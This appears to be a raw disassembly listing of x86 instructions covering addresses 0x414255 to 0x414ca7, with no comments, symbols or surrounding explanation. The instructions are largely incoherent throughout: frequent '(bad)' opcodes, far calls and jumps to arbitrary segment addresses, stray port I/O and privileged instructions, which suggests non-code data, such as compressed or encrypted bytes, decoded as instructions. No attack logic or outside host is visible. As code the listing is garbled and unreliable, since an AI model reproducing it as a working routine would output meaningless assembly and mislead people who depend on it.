  414255:	dec    edx
  414256:	xor    dh,BYTE PTR [edi-0x7b]
  414259:	dec    esp
  41425a:	cld    
  41425b:	pop    es
  41425c:	and    ecx,DWORD PTR [esi]
  41425e:	jno    0x4142ad
  414260:	aas    
  414261:	repnz aam 0x69
  414264:	dec    ecx
  414265:	and    esp,esi
  414267:	xchg   ebp,eax
  414268:	mov    eax,esi
  41426a:	inc    sp
  41426c:	mov    ecx,0xe0360c9
  414271:	or     DWORD PTR ds:0x1d7576d3,eax
  414277:	lock loop 0x41428d
  41427a:	push   0xd56b7d22
  41427f:	retf   0x1e07
  414282:	adc    eax,0x9f85f0ba
  414287:	repnz inc edi
  414289:	jge    0x414285
  41428b:	push   0x3f
  41428d:	mov    BYTE PTR [ecx],ch
  41428f:	mov    ds:0x2d901dce,al
  414294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414295:	dec    ebp
  414296:	dec    esi
  414297:	cdq    
  414298:	sbb    al,0x7d
  41429a:	cmp    ebp,DWORD PTR [edx+0x26633cb6]
  4142a0:	std    
  4142a1:	call   0xbdbf:0xa8b8ad52
  4142a8:	nop
  4142a9:	inc    ebp
  4142aa:	xchg   esp,eax
  4142ab:	push   ebx
  4142ac:	sub    esp,edi
  4142ae:	xlat   BYTE PTR ds:[ebx]
  4142af:	xor    eax,0x905cf5b3
  4142b4:	adc    BYTE PTR [eax],al
	...
  414316:	add    DWORD PTR [ecx-0x2122293],eax
  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0xd6e09f60
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [eax+0x6d23322],cl
  414333:	xchg   edi,eax
  414334:	pop    eax
  414335:	xor    eax,0xb24e0364
  41433a:	mov    DWORD PTR [ecx],eax
  41433c:	adc    al,0xd6
  41433e:	push   es
  41433f:	push   edi
  414340:	mov    ch,0x54
  414342:	jle    0x41437c
  414344:	sub    eax,edi
  414346:	outs   dx,DWORD PTR ds:[esi]
  414347:	data16 cmp al,0x35
  41434a:	or     al,0x6b
  41434c:	mov    esi,0xc3916527
  414351:	aam    0x4b
  414353:	out    dx,eax
  414354:	or     al,ch
  414356:	sar    BYTE PTR [ebx+0x6e],cl
  414359:	jbe    0x414344
  41435b:	add    DWORD PTR [ebp+0x45b9b97f],ecx
  414361:	hlt    
  414362:	aam    0xfc
  414364:	fs ins DWORD PTR es:[edi],dx
  414366:	dec    edx
  414367:	push   0xffffffea
  414369:	addr16 test al,0x5d
  41436c:	retf   
  41436d:	jge    0x414388
  41436f:	xchg   edx,eax
  414370:	aaa    
  414371:	jl     0x4143d4
  414373:	icebp  
  414374:	or     BYTE PTR [edx],dl
  414376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414377:	cmp    DWORD PTR [edx+edi*8-0x64],ebp
  41437b:	ret    
  41437c:	or     dl,bl
  41437e:	in     eax,0x9e
  414380:	rcl    bh,0x23
  414383:	cmp    BYTE PTR [eax-0x5],bh
  414386:	lods   eax,DWORD PTR ds:[esi]
  414387:	imul   ebx,DWORD PTR [eax+edx*2-0x51],0xffffffdd
  41438c:	add    BYTE PTR [edx],ch
  41438e:	and    al,0x6
  414390:	sti    
  414391:	or     esi,ebx
  414393:	aas    
  414394:	jmp    0x761ac0a3
  414399:	mov    cl,0x67
  41439b:	das    
  41439c:	pop    esp
  41439d:	lock and eax,0x40d91063
  4143a3:	addr16 pushf 
  4143a5:	jbe    0x414390
  4143a7:	xchg   ecx,eax
  4143a8:	out    0x74,al
  4143aa:	xchg   DWORD PTR [esi+0x7e],ebx
  4143ad:	fistp  WORD PTR [ecx]
  4143af:	rcl    BYTE PTR [ebx-0x3e3fa67f],0xa7
  4143b6:	ja     0x414394
  4143b8:	inc    edi
  4143b9:	mov    ds:0xe81f6411,al
  4143be:	mov    esi,0x929b29b9
  4143c3:	frstor [edi-0x459f2374]
  4143c9:	(bad)  
  4143ca:	rcr    BYTE PTR [edx-0x5623acb1],cl
  4143d0:	inc    ebx
  4143d1:	and    bl,BYTE PTR [edx-0x4]
  4143d4:	mov    dl,0xe3
  4143d6:	jbe    0x4143e4
  4143d8:	mov    ebp,0x8bc8377c
  4143dd:	or     ebp,esi
  4143df:	ret    
  4143e0:	or     dh,BYTE PTR [esi]
  4143e2:	xchg   edi,eax
  4143e3:	add    eax,0x1b59d584
  4143e8:	push   ebx
  4143e9:	imul   esp,DWORD PTR [eax+0x3a],0x65
  4143ed:	pop    esi
  4143ee:	pushf  
  4143ef:	loope  0x4143d5
  4143f1:	scas   al,BYTE PTR es:[edi]
  4143f2:	test   al,0xc4
  4143f4:	les    eax,FWORD PTR [edi]
  4143f6:	add    dh,bl
  4143f8:	cmp    BYTE PTR [ebx],0x85
  4143fb:	sbb    al,0xc7
  4143fd:	pop    ds
  4143fe:	push   eax
  4143ff:	add    al,0x93
  414401:	daa    
  414402:	add    al,0x62
  414404:	in     al,dx
  414405:	(bad)  
  414406:	idiv   DWORD PTR [ecx-0x24c5484b]
  41440c:	adc    dh,BYTE PTR [ebx-0xe]
  41440f:	arpl   WORD PTR [ecx-0x6e],dx
  414412:	iret   
  414413:	jmp    0x6693:0xf630030f
  41441a:	stc    
  41441b:	cmp    DWORD PTR [eax-0x55e76695],ebx
  414421:	mul    BYTE PTR [esi]
  414423:	or     cl,dh
  414425:	icebp  
  414426:	jle    0x414412
  414428:	sbb    eax,0x38a6b43a
  41442d:	icebp  
  41442e:	jbe    0x4144a3
  414430:	dec    ebp
  414431:	cmp    BYTE PTR [ecx-0x56],al
  414434:	mov    DWORD PTR [eax],0x0
	...
  414496:	pop    ebx
  414497:	jae    0x4144db
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	or     esi,DWORD PTR [edx]
  4144a4:	cmp    DWORD PTR [edi+0x9],eax
  4144a7:	rol    DWORD PTR [eax],cl
  4144a9:	add    BYTE PTR [edi],al
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    BYTE PTR [esi+0x44],ch
  4144b0:	rol    edi,cl
  4144b2:	jg     0x41444c
  4144b4:	mov    dl,0x2e
  4144b6:	sub    al,0x2b
  4144b8:	(bad)  [ecx-0xa]
  4144bb:	jl     0x414474
  4144bd:	imul   eax,ebp,0x47
  4144c0:	mov    ah,0x24
  4144c2:	adc    BYTE PTR [esi-0x2a],al
  4144c5:	sub    ch,BYTE PTR [ebp-0x22]
  4144c8:	dec    ebp
  4144c9:	ins    DWORD PTR es:[edi],dx
  4144ca:	jo     0x414516
  4144cc:	int3   
  4144cd:	aas    
  4144ce:	call   0x7e0:0xa1815399
  4144d5:	mov    ch,0xd2
  4144d7:	stos   BYTE PTR es:[edi],al
  4144d8:	gs jmp 0x30b5d3ce
  4144de:	inc    edx
  4144df:	and    BYTE PTR [ecx-0x50b76f91],ah
  4144e5:	jne    0x414496
  4144e7:	stc    
  4144e8:	sbb    edi,DWORD PTR [edi]
  4144ea:	jmp    0xfee7ad95
  4144ef:	or     eax,DWORD PTR [eax-0x52fd8040]
  4144f5:	(bad)  
  4144f6:	push   ds
  4144f7:	add    al,0x8e
  4144f9:	push   ss
  4144fa:	mov    ebx,0xf7dd8729
  4144ff:	mov    bl,cl
  414501:	and    eax,0xf7e0ac15
  414506:	pop    es
  414507:	mul    cl
  414509:	add    edi,DWORD PTR [ebx]
  41450b:	and    eax,0x5695e0b4
  414510:	mov    edx,0xe499559f
  414515:	or     dl,bh
  414517:	lods   eax,DWORD PTR ds:[esi]
  414518:	mov    al,ds:0x332eae44
  41451d:	pop    ebp
  41451e:	popa   
  41451f:	les    edi,FWORD PTR [ebx+0x6e85cae9]
  414525:	jg     0x41450b
  414527:	adc    eax,0x1dae5147
  41452c:	sti    
  41452d:	in     al,0x75
  41452f:	push   ss
  414530:	loop   0x41452e
  414532:	sub    al,0x4d
  414534:	xor    DWORD PTR [ebx+0x20],ebx
  414537:	xor    ebx,ebp
  414539:	sub    al,0xe
  41453b:	push   ebx
  41453c:	jmp    0x414561
  41453e:	in     eax,dx
  41453f:	or     eax,0x9b9900cb
  414544:	dec    esp
  414545:	pop    edi
  414546:	sbb    al,0x81
  414548:	or     edi,DWORD PTR [esi]
  41454a:	test   esp,edi
  41454c:	imul   edx,DWORD PTR [ebp-0x40],0x14
  414550:	std    
  414551:	adc    esp,DWORD PTR [ebp-0x7d]
  414554:	xor    BYTE PTR [ecx],dh
  414556:	out    0x43,al
  414558:	(bad)  
  414559:	ret    
  41455a:	mov    cl,BYTE PTR [edx]
  41455c:	gs pop ss
  41455e:	dec    esi
  41455f:	test   al,0x54
  414561:	mov    al,0x93
  414563:	js     0x4145c7
  414565:	adc    BYTE PTR [ebp-0x6f0374c0],0x8a
  41456c:	ret    
  41456d:	cmp    al,0x32
  41456f:	sbb    DWORD PTR [edx+esi*1+0x47],esp
  414573:	mov    eax,0xfa8acc20
  414578:	shr    BYTE PTR [esi+0x238650d1],1
  41457e:	pop    ss
  41457f:	enter  0x90d6,0xe7
  414583:	sub    al,0xfe
  414585:	mov    edx,DWORD PTR [esi]
  414587:	sub    ecx,ecx
  414589:	mov    eax,0xab11b3e2
  41458e:	sahf   
  41458f:	xchg   BYTE PTR [edi+eiz*2],cl
  414592:	cmp    DWORD PTR [edi+0x2785806c],ecx
  414598:	adc    edi,DWORD PTR [edi-0x68]
  41459b:	inc    ecx
  41459c:	inc    eax
  41459d:	fs lock cmp eax,0xe22aa30c
  4145a4:	push   esp
  4145a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145a6:	mov    eax,0x14a3e782
  4145ab:	dec    ebx
  4145ac:	ja     0x41457b
  4145ae:	lds    ecx,FWORD PTR [ebx+0x8]
  4145b1:	sar    DWORD PTR [esi+0xa1f5],cl
	...
  414613:	add    BYTE PTR [eax],al
  414615:	add    BYTE PTR [edi+0x5e],bh
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0xb8740dc2
  414624:	pop    ss
  414625:	inc    esi
  414626:	adc    ah,dl
  414628:	add    BYTE PTR [eax],al
  41462a:	pop    es
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [eax+0x49a4a7c3],cl
  414633:	pop    eax
  414634:	loopne 0x4145eb
  414636:	ja     0x41460d
  414638:	icebp  
  414639:	test   BYTE PTR [esi+0x6c523a8e],al
  41463f:	sbb    bl,BYTE PTR [ecx+0xd]
  414642:	je     0x414629
  414644:	push   ebp
  414645:	(bad)  
  414646:	jmp    0x414670
  414648:	or     DWORD PTR [ecx+0x33],ebp
  41464b:	mov    ebp,0xc33294a0
  414650:	adc    BYTE PTR [ebx-0x34af1531],dl
  414656:	jl     0x41462f
  414658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414659:	js     0x4146c3
  41465b:	jo     0x41462b
  41465d:	mov    esp,0x125007ba
  414662:	test   DWORD PTR [eax-0x1e735213],ebp
  414668:	pop    es
  414669:	push   ebx
  41466a:	mov    ds:0x3fb2c59a,al
  41466f:	xchg   esi,eax
  414670:	popf   
  414671:	or     al,0x79
  414673:	hlt    
  414674:	mov    ch,0x75
  414676:	popa   
  414677:	push   edi
  414678:	shr    DWORD PTR ds:0x6966dae0,1
  41467e:	xor    al,0xd1
  414680:	out    0x38,eax
  414682:	ins    BYTE PTR es:[edi],dx
  414683:	mov    edi,0xd7dde95a
  414688:	jge    0x414671
  41468a:	push   0x53833b39
  41468f:	xchg   ecx,eax
  414690:	or     al,0xaa
  414692:	or     esi,0xfffffff4
  414695:	pop    es
  414696:	dec    esi
  414697:	xor    BYTE PTR [edx-0x72],bl
  41469a:	dec    edx
  41469b:	frstorw ss:[ebp+0xb]
  4146a0:	shl    DWORD PTR [edi+ebp*1],1
  4146a3:	mov    ah,0xd1
  4146a5:	popa   
  4146a6:	pop    ds
  4146a7:	sub    al,0xfd
  4146a9:	test   BYTE PTR [edi],0x72
  4146ac:	pop    ecx
  4146ad:	xchg   edx,eax
  4146ae:	push   cs
  4146af:	call   0x861e:0x2a6d0cf1
  4146b6:	pop    eax
  4146b7:	clc    
  4146b8:	pop    esp
  4146b9:	push   ecx
  4146ba:	push   cs
  4146bb:	outs   dx,BYTE PTR ds:[esi]
  4146bc:	js     0x4146be
  4146be:	and    bl,BYTE PTR [eax-0x72f0b082]
  4146c4:	xchg   esp,eax
  4146c5:	push   esp
  4146c6:	lahf   
  4146c7:	mov    ds:0x3a2a582b,al
  4146cc:	mov    edi,0x5abb29a6
  4146d1:	popf   
  4146d2:	sub    BYTE PTR [esi-0x11213987],0xf5
  4146d9:	loope  0x414747
  4146db:	cmp    esp,DWORD PTR [ebp+eiz*1-0x7adc91ab]
  4146e2:	xchg   esi,eax
  4146e3:	sub    ebp,DWORD PTR [eax+0x72f40eb]
  4146e9:	popa   
  4146ea:	rol    al,1
  4146ec:	fnstenv [edi]
  4146ee:	enter  0x92e4,0x86
  4146f2:	repnz pop esp
  4146f4:	sub    DWORD PTR [edx+eiz*2-0x598f3572],ebx
  4146fb:	call   0x972e7a0
  414700:	sub    BYTE PTR ds:0xab5b4b94,al
  414706:	pop    es
  414707:	xchg   esi,eax
  414708:	sbb    eax,0x208d9fc9
  41470d:	(bad)  
  41470e:	mov    al,ds:0x447e726
  414713:	daa    
  414714:	pushf  
  414715:	xor    esp,DWORD PTR [ecx+eiz*8+0x2768a3f0]
  41471c:	mov    ds:0x322f430,eax
  414721:	mov    cl,0x9f
  414723:	jmp    0xcd39:0x22c5fb8e
  41472a:	sbb    BYTE PTR [ecx-0x76],al
  41472d:	jecxz  0x4146bb
  41472f:	int3   
  414730:	sar    DWORD PTR [ecx+0x1a6aca],0x0
	...
  414793:	add    BYTE PTR [eax],al
  414795:	add    BYTE PTR [esi+0x2f],bh
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	test   BYTE PTR [edx],bh
  4147a4:	jmp    0x700:0xd517c6
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [ebx-0x48],bl
  4147b0:	loop   0x4147ee
  4147b2:	pop    ds
  4147b3:	pushf  
  4147b4:	xor    bl,dh
  4147b6:	push   ebp
  4147b7:	ffreep st(5)
  4147b9:	or     DWORD PTR [edi+0x1],eax
  4147bc:	mov    cs,eax
  4147be:	out    dx,al
  4147bf:	sbb    DWORD PTR [ebx-0x22],ebx
  4147c2:	retf   
  4147c3:	mov    eax,0xd5298bc1
  4147c8:	jecxz  0x41483a
  4147ca:	pop    eax
  4147cb:	es mov al,ah
  4147ce:	lahf   
  4147cf:	cmp    eax,0x21d73212
  4147d4:	inc    eax
  4147d5:	(bad)  
  4147d6:	test   eax,0x410fc607
  4147db:	xchg   edx,eax
  4147dc:	cmp    DWORD PTR [edx],ebp
  4147de:	jmp    0x4147cf
  4147e0:	pop    eax
  4147e1:	add    eax,0x34f1ce1f
  4147e6:	mov    ?,esi
  4147e8:	stos   BYTE PTR es:[edi],al
  4147e9:	add    al,0xf4
  4147eb:	and    esi,ebx
  4147ed:	dec    edi
  4147ee:	aaa    
  4147ef:	ror    BYTE PTR [ebp-0x5],1
  4147f2:	xchg   ebx,eax
  4147f3:	and    bl,BYTE PTR [esi-0x2a]
  4147f6:	push   es
  4147f7:	mov    esi,DWORD PTR [esi+0x8]
  4147fa:	rol    BYTE PTR [ecx+ebp*1],cl
  4147fd:	mov    ds:0x24ab3cd0,eax
  414802:	and    al,0x83
  414804:	bound  ebp,QWORD PTR [eax+0x52]
  414807:	sub    eax,0x381500ab
  41480c:	js     0x41480a
  41480e:	xor    cl,0x9a
  414811:	ins    DWORD PTR es:[edi],dx
  414812:	push   0x56dfd2bc
  414817:	or     al,BYTE PTR [edi]
  414819:	adc    BYTE PTR [esi+edx*8],bh
  41481c:	xchg   ebx,eax
  41481d:	or     BYTE PTR [ebx+0x459123eb],0x14
  414824:	cs ret 
  414826:	mov    eax,ds:0x8a13a9e3
  41482b:	mov    edi,0x4b50e57
  414830:	pop    edi
  414831:	je     0x4147b3
  414833:	jo     0x41489d
  414835:	cmp    bl,bl
  414837:	jo     0x4147c2
  414839:	mov    edi,0x3a683edc
  41483e:	cmc    
  41483f:	mov    dh,0x71
  414841:	adc    esp,edi
  414843:	fwait
  414844:	lock cmp eax,0x8c8e78c6
  41484a:	jg     0x4147ce
  41484c:	fidivr DWORD PTR [eax-0x6370c048]
  414852:	scas   eax,DWORD PTR es:[edi]
  414853:	xchg   ebp,eax
  414854:	jns    0x4147ea
  414856:	inc    edx
  414857:	arpl   si,ax
  414859:	stos   DWORD PTR es:[edi],eax
  41485a:	repnz adc BYTE PTR [edi-0x1569f599],cl
  414861:	xchg   esi,eax
  414862:	jecxz  0x4148b6
  414864:	outs   dx,BYTE PTR ds:[esi]
  414865:	(bad)  
  414866:	xor    BYTE PTR [ecx+0x5c],ah
  414869:	cmp    DWORD PTR [esi],0xffffffff
  41486c:	aad    0x2c
  41486e:	sbb    DWORD PTR gs:[ecx+0x4d9ef8c9],ebp
  414875:	dec    ebx
  414876:	and    al,0x5d
  414878:	jmp    0x4148d5
  41487a:	add    BYTE PTR [ecx-0x1f],cl
  41487d:	push   ebx
  41487e:	ds mov dh,0xf3
  414881:	fdiv   QWORD PTR [edi-0x4262e750]
  414887:	sub    edi,DWORD PTR [esi-0x63aeccf8]
  41488d:	push   esi
  41488e:	sub    ebx,ecx
  414890:	push   0x4c
  414892:	js     0x41490b
  414894:	dec    edx
  414895:	push   cs
  414896:	or     al,0xba
  414898:	ja     0x41484a
  41489a:	mov    ebx,0x1c94699c
  41489f:	add    DWORD PTR [edx],ecx
  4148a1:	adc    ebp,edi
  4148a3:	imul   ebx,DWORD PTR ds:0x85aa6100,0xffffffbe
  4148aa:	mov    ch,0xa1
  4148ac:	or     ecx,DWORD PTR [edi-0x6e]
  4148af:	clc    
  4148b0:	push   ebp
  4148b1:	(bad)  
  4148b2:	lea    esp,es:[eax+eax*1+0x0]
	...
  414913:	add    BYTE PTR [eax],al
  414915:	add    BYTE PTR [ebx],cl
  414917:	jle    0x4148eb
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x9cb9c1ed
  414924:	sbb    ebp,DWORD PTR [edx+0xd61e]
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [esi-0x42],bh
  414930:	cmp    edi,ebx
  414932:	add    cl,bl
  414934:	xor    al,0xa6
  414936:	xchg   ebp,eax
  414937:	inc    eax
  414938:	cpuid  
  41493a:	gs push ebp
  41493c:	in     al,0x8
  41493e:	es ret 
  414940:	and    BYTE PTR [edx+ebx*1+0x7ad3d5a6],dh
  414947:	pop    esi
  414948:	xchg   DWORD PTR [eax],esp
  41494a:	pop    esp
  41494b:	lods   al,BYTE PTR ds:[esi]
  41494c:	xchg   ecx,eax
  41494d:	cmp    eax,0xc8575596
  414952:	inc    edi
  414953:	sub    ch,cl
  414955:	leave  
  414956:	jle    0x4148f8
  414958:	outs   dx,DWORD PTR ds:[esi]
  414959:	rcr    DWORD PTR [ecx-0x5e3aa56b],cl
  41495f:	cmp    eax,0x8feae61f
  414964:	sbb    ebx,DWORD PTR [ecx-0x68]
  414967:	addr16 inc ecx
  414969:	sub    DWORD PTR [ecx],eax
  41496b:	mov    ds:0x90b2fee3,al
  414970:	stc    
  414971:	in     eax,dx
  414972:	mov    al,0xd
  414974:	sbb    edx,edi
  414976:	pop    ebp
  414977:	idiv   DWORD PTR [esi+0x4b]
  41497a:	adc    al,0x29
  41497c:	popa   
  41497d:	jbe    0x414960
  41497f:	adc    eax,eax
  414981:	in     eax,dx
  414982:	pusha  
  414983:	jge    0x414919
  414985:	cmp    al,dh
  414987:	dec    ecx
  414988:	(bad)  
  41498a:	cdq    
  41498b:	mov    dx,0xeb8a
  41498f:	popa   
  414990:	xor    DWORD PTR [edi],0x8aea26f2
  414996:	xor    bl,cl
  414998:	or     eax,0xb30c0f21
  41499d:	xor    al,0x59
  41499f:	mov    dh,0x51
  4149a1:	dec    eax
  4149a2:	ss inc ecx
  4149a4:	retf   0x8e3c
  4149a7:	jl     0x4149ce
  4149a9:	cmp    cl,BYTE PTR [eax]
  4149ab:	or     BYTE PTR [ecx+0x5a],al
  4149ae:	or     eax,0xe868132d
  4149b3:	sub    BYTE PTR [eax],dl
  4149b5:	imul   BYTE PTR [ecx+0x326b6527]
  4149bb:	pop    es
  4149bc:	repz mov eax,ds:0xa45a93e5
  4149c2:	pop    ebp
  4149c3:	mov    ?,ecx
  4149c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c6:	out    dx,al
  4149c7:	push   edx
  4149c8:	ins    BYTE PTR es:[edi],dx
  4149c9:	mov    esi,0xc7b90a16
  4149ce:	mov    ecx,eax
  4149d0:	mov    ecx,0xa9f867a8
  4149d5:	or     al,0xbc
  4149d7:	xchg   esp,eax
  4149d8:	cmc    
  4149d9:	dec    eax
  4149da:	pop    esp
  4149db:	push   ds
  4149dc:	je     0x4149bc
  4149de:	sbb    ecx,eax
  4149e0:	xor    edx,DWORD PTR [ebp+0x49d7af50]
  4149e6:	cmp    DWORD PTR ds:0x77ad9435,edx
  4149ec:	inc    DWORD PTR [eax+0x3f6bb183]
  4149f2:	sub    DWORD PTR [ecx+0x45],edx
  4149f5:	xor    edx,edx
  4149f7:	mov    WORD PTR [ebx],fs
  4149f9:	push   0x16
  4149fb:	shl    DWORD PTR [ebp-0x32],0x85
  4149ff:	fisttp QWORD PTR [edx-0x65f659af]
  414a05:	jge    0x414a56
  414a07:	and    al,0xd4
  414a09:	pushf  
  414a0a:	mul    edx
  414a0c:	mov    DWORD PTR [ecx+0x56],edi
  414a0f:	(bad)  
  414a11:	sub    BYTE PTR ds:0x7cbae20a,ah
  414a17:	pusha  
  414a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a19:	or     eax,DWORD PTR [eax+0x63]
  414a1c:	retf   0x406b
  414a1f:	or     BYTE PTR [edi],bl
  414a21:	jae    0x414a99
  414a23:	push   0x47e09713
  414a28:	sub    al,0x84
  414a2a:	es mov esi,0x97fc4660
  414a30:	mov    bh,0xf6
  414a32:	jp     0x414a84
  414a34:	add    al,0x0
	...
  414a96:	lahf   
  414a97:	fnstcw WORD PTR [esi]
  414a99:	ss jle 0x414a93
  414a9c:	lahf   
  414a9d:	stc    
  414a9e:	and    al,0x64
  414aa0:	mov    dl,0x1b
  414aa2:	fidiv  WORD PTR [ecx-0x4c]
  414aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa6:	and    eax,0x70000d7
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [eax-0x4fbcc2af],dh
  414ab3:	add    eax,0xac61480a
  414ab8:	mov    ds,WORD PTR [edx]
  414aba:	fwait
  414abb:	inc    esi
  414abc:	pop    edx
  414abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414abe:	imul   ecx,DWORD PTR [ecx+0x5c73e73b],0xffffffcd
  414ac5:	add    al,0x2c
  414ac7:	loop   0x414a72
  414ac9:	rcr    bl,0x92
  414acc:	sahf   
  414acd:	jne    0x414aaa
  414acf:	jns    0x414a95
  414ad1:	fwait
  414ad2:	pusha  
  414ad3:	or     DWORD PTR [ecx-0x6d],ebp
  414ad6:	loopne 0x414af6
  414ad8:	adc    eax,0xc322ce40
  414add:	jns    0x414ae6
  414adf:	out    0x36,eax
  414ae1:	xchg   DWORD PTR [eax+0x7],esi
  414ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae5:	mov    edi,0x673a9604
  414aea:	xor    BYTE PTR [eax+0x732b512c],al
  414af0:	in     al,dx
  414af1:	in     eax,dx
  414af2:	in     eax,dx
  414af3:	pop    esi
  414af4:	push   cs
  414af5:	xor    bh,BYTE PTR [esi-0x1d29377]
  414afb:	(bad)  
  414afc:	aam    0x29
  414afe:	loopne 0x414b5a
  414b00:	pop    ebp
  414b01:	idiv   BYTE PTR [ebx]
  414b03:	pop    ss
  414b04:	sbb    dh,cl
  414b06:	xor    eax,0x639fd508
  414b0b:	xor    ecx,DWORD PTR [ecx]
  414b0d:	pop    ss
  414b0e:	sahf   
  414b0f:	pop    ebx
  414b10:	in     eax,0x58
  414b12:	xor    DWORD PTR [eax-0x6b626994],ebp
  414b18:	fs cs popf 
  414b1b:	call   0x34610dc5
  414b20:	fist   DWORD PTR [eax]
  414b22:	imul   esi,DWORD PTR [ecx],0xffffff89
  414b25:	pop    ebx
  414b26:	and    BYTE PTR [ebx-0xa],ch
  414b29:	pushf  
  414b2a:	adc    bl,BYTE PTR fs:[edi]
  414b2d:	clc    
  414b2e:	push   es
  414b2f:	jge    0x414b73
  414b31:	in     eax,dx
  414b32:	lds    eax,FWORD PTR [eax-0x5e]
  414b35:	retf   
  414b36:	cmp    BYTE PTR [eax+0x16fc0c0b],ah
  414b3c:	loope  0x414ad9
  414b3e:	fcom   QWORD PTR [edx-0x5d0ab2a6]
  414b44:	mov    edx,0x15d3f00e
  414b49:	xchg   ebp,eax
  414b4a:	jmp    0x958e564
  414b4f:	inc    esi
  414b50:	cmp    BYTE PTR [edi],bl
  414b52:	mov    ecx,DWORD PTR [esi-0x68]
  414b55:	fucompp 
  414b57:	xchg   ebx,eax
  414b58:	jp     0x414b06
  414b5a:	pop    ecx
  414b5b:	mov    al,0x39
  414b5d:	xchg   DWORD PTR [edx+0x13],edi
  414b60:	adc    BYTE PTR [ebx+edi*1-0x625d61da],cl
  414b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b68:	jne    0x414b2d
  414b6a:	mov    BYTE PTR [edx],al
  414b6c:	jae    0x414bc8
  414b6e:	test   al,0x32
  414b70:	jae    0x414b93
  414b72:	pop    esp
  414b73:	sti    
  414b74:	(bad)  
  414b75:	push   edi
  414b76:	jecxz  0x414b64
  414b78:	inc    edi
  414b79:	xor    al,0x1e
  414b7b:	das    
  414b7c:	jmp    0x414b53
  414b7e:	sbb    BYTE PTR [ecx+0x4b],cl
  414b81:	push   edx
  414b82:	push   es
  414b83:	push   0xa612c1b0
  414b88:	push   es
  414b89:	outs   dx,DWORD PTR ds:[esi]
  414b8a:	mov    dh,0x61
  414b8c:	aas    
  414b8d:	pop    ds
  414b8e:	xchg   esp,eax
  414b8f:	in     al,0x3d
  414b91:	into   
  414b92:	push   esi
  414b93:	jbe    0x414b37
  414b95:	les    esp,FWORD PTR [ecx]
  414b97:	push   ebp
  414b98:	dec    esp
  414b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b9a:	nop
  414b9b:	xchg   ecx,eax
  414b9c:	push   ebx
  414b9d:	sbb    cl,BYTE PTR [ebp+0xddf6223]
  414ba3:	clc    
  414ba4:	fnstsw WORD PTR [ebx-0x694cb2aa]
  414baa:	(bad)  
  414bab:	rol    DWORD PTR [ecx+0x5bc36474],cl
  414bb1:	fld    DWORD PTR [ebp+0x17]
  414bb4:	fld    DWORD PTR [eax]
	...
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	ret    
  414c23:	pusha  
  414c24:	xchg   esp,eax
  414c25:	add    ebp,DWORD PTR [eax+ebx*8]
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    dh,dh
  414c2f:	jle    0x414c1b
  414c31:	fxch   st(5)
  414c33:	add    eax,DWORD PTR [edi+0x62db56bd]
  414c39:	int    0x6a
  414c3b:	mov    al,0xe5
  414c3d:	add    ch,BYTE PTR [edi+0x416577ec]
  414c43:	repz into 
  414c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c46:	xlat   BYTE PTR ds:[ebx]
  414c47:	addr16 mov eax,0x63bf4ca1
  414c4d:	leave  
  414c4e:	push   0x69
  414c50:	or     BYTE PTR [ebx+eax*4-0x5c],cl
  414c54:	retf   0x6df0
  414c57:	out    0x5d,eax
  414c59:	mov    esp,0x5c0e040c
  414c5e:	call   0x79c342c4
  414c63:	dec    ecx
  414c64:	add    edx,ebx
  414c66:	or     BYTE PTR [edi],0xfa
  414c69:	stos   BYTE PTR es:[edi],al
  414c6a:	xchg   BYTE PTR [ecx+eiz*2+0xc686ac9],ch
  414c71:	fbstp  TBYTE PTR [edx+0x3e5bff1e]
  414c77:	xor    bl,BYTE PTR ds:0x54e7641b
  414c7d:	daa    
  414c7e:	mov    ah,BYTE PTR [ebx+0x356b9d62]
  414c84:	mov    ecx,0x4362868a
  414c89:	mov    dh,0x4e
  414c8b:	aas    
  414c8c:	test   BYTE PTR [ecx+0x2bf0a599],dl
  414c92:	stos   BYTE PTR es:[edi],al
  414c93:	xchg   esp,eax
  414c94:	test   DWORD PTR [esi+edi*8],eax
  414c97:	cbw    
  414c99:	fimul  WORD PTR [edi+0x70]
  414c9c:	or     BYTE PTR [edi],bl
  414c9e:	ds push cs
  414ca0:	test   eax,0x4e1bff11
  414ca5:	int    0xf
  414ca7:	cdq    
